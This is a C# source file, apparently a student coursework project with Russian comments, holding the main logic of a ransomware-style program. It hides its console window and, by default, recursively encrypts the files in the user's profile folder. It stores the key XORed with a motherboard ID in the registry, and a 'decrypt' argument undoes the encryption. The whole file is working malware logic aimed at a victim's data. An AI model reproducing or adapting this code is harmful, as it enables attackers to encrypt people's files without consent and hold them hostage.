using System;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Diagnostics;

namespace CourseWork
{
    internal class Program {
        // Путь к папке пользователя (c:\users\<username>)
        private static readonly string START_DIR = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        
        public static void Main (string[] args)
        {
            // Спрятать окно темринала
            SystemUtils.hideWindow();

            Stopwatch stopWatch = new Stopwatch();
            stopWatch.Start();

            if (args.Length > 0 && args[0] == "decrypt")
            {
                // Запрошено расшифровывание
                decryptFilesystem();
            }
            else
            {
                // По умолчанию шифрование
                encryptFilesystem();
            }
            stopWatch.Stop();
            TimeSpan ts = stopWatch.Elapsed;

            string elapsedTime = String.Format("{0:00}:{1:00}:{2:00}.{3:00}",
                ts.Hours, ts.Minutes, ts.Seconds,
                ts.Milliseconds / 10);
            Console.WriteLine("RunTime " + elapsedTime);

            GC.Collect();

            Console.Read();
        }

        private static void encryptFilesystem ()
        {
            // Получить id железа
            var cpuId = Hwid.getCpuId();
            var boardId = Hwid.getBoardId();

            // Сгенерировать ключ
            var key = Crypto.generateKey(32);
            // Рекурсивно зашифровать все файлы используя случайный ключ и cpuId в качестве IV
            FileUtils.recursiveWalker(
                START_DIR,
                file => Crypto.encryptFile(file, key, cpuId),
                FileUtils.EXTENSIONS_FILTER
            );
            
            // Записать ключ в реестр
            var reg = Registry.CurrentUser.CreateSubKey(@"Software\crypto\uwu");
            // Но не в чистом виде, а xor-нутый с boardId
            reg.SetValue("owo", Crypto.xor(key, boardId));
        }

        private static void decryptFilesystem ()
        {
            // Получить id железа
            var cpuId = Hwid.getCpuId();
            var boardId = Hwid.getBoardId();

            // Получить ключ из реестра сохраненный ранее
            var reg = Registry.CurrentUser.OpenSubKey(@"Software\crypto\uwu");
            var regKey = reg.GetValue(@"owo", null);
            if (reg == null || regKey == null)
            {
                // Ключа нет в реестре, значит ничего не зашифровано
                SystemUtils.showWindow();
                Console.WriteLine("Your system is not encrypted! Press any key to exit.");
                Console.ReadKey();
                return;
            }
            
            // Удалить ключ из реестра
            Registry.CurrentUser.DeleteSubKey(@"Software\crypto\uwu");

            // Восстановить оригинальный ключ через xor с boardId
            var key = Crypto.xor((byte[]) regKey, boardId);
            
            // Рекурсивно дешифровать все файлы
            FileUtils.recursiveWalker(
                START_DIR,
                file => Crypto.decryptFile(file, key, cpuId),
                new HashSet<string> { ".crypto" }
            );
        }
    }
}